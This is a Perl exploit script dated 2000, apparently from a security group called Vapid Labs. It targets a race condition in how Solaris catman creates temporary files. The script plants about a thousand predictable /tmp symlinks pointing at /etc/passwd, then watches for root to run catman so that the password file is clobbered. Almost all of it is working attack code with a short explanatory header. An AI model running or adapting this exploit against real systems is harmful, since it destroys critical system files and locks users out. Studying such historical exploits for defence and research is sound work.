#!/usr/local/bin/perl -w 
# The problem is catman creates files in /tmp insecurly. They are based on the 
# PID of the catman process,  catman will happily clobber any files that are 
# symlinked to that file.
# The idea of this script is to create a block of symlinks to the target file 
# with the current PID  as a starting point.  Depending on what load your
# system has this creates 1000 files in /tmp as sman_$currentpid + 1000.
# The drawback is you would have to know around when root would be executing 
# catman. 
# A better solution would be to monitor for the catman process and create the 
# link before catman creates the file.  I think this is a really small window 
# however. This worked on a patched Solaris 2.7 box (August 2000 patch
# cluster)
# SunOS rootabega 5.7 Generic_106541-12 sun4u sparc SUNW,Ultra-1
# lwc@vapid.betteros.org   11/21/2000   Vapid Labs.
# http://vapid.betteros.org

$clobber = "/etc/passwd"; #file to clobber
$X=getpgrp();
$Xc=$X; #Constant
$Y=$X+1000;#Constant

while($X < $Y) {

print "Linking /tmp/sman_$X to $clobber :"; 
# Change $clobber to what you want to clobber.
if (symlink ($clobber, "/tmp/sman_$X")) {
        print "Sucess\n";
}
        else { print "failed, Busy system?\n";}
$X=$X+1;
}


#Watch /tmp and see if catman is executed in time.

while(1)  {

$list = "/usr/bin/ls -l /tmp | grep sman|grep root |";

open (list,$list) or "die cant open ls...\n";

while(<list>) {
        @args = split "_",$_;
        chop ($args[1]);
    if ($args[1] >= $Xc && $args[1] <= $Y){
                print "Looks like pid $args[1] is the winner\n cleaning....\n"; 
                `/usr/bin/rm -f /tmp/sman*`;
                exit(1);
    }
  }
}
